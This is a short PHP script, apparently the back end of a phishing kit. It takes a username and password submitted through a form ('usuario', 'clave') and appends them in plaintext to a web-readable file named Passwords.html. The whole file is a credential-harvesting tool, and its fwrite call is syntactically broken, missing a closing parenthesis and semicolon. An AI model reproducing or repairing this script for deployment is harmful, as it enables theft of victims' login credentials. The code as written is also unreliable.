<?php

	$usuario = $_POST['usuario'];
	$clave = $_POST['clave'];
	
$f = fopen("Passwords.html", "a");
			fwrite ($f,
			'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
			Password: [<b><font color="#9900FF">'.$clave.'</font></b>]<br>'
			fclose($f);
?>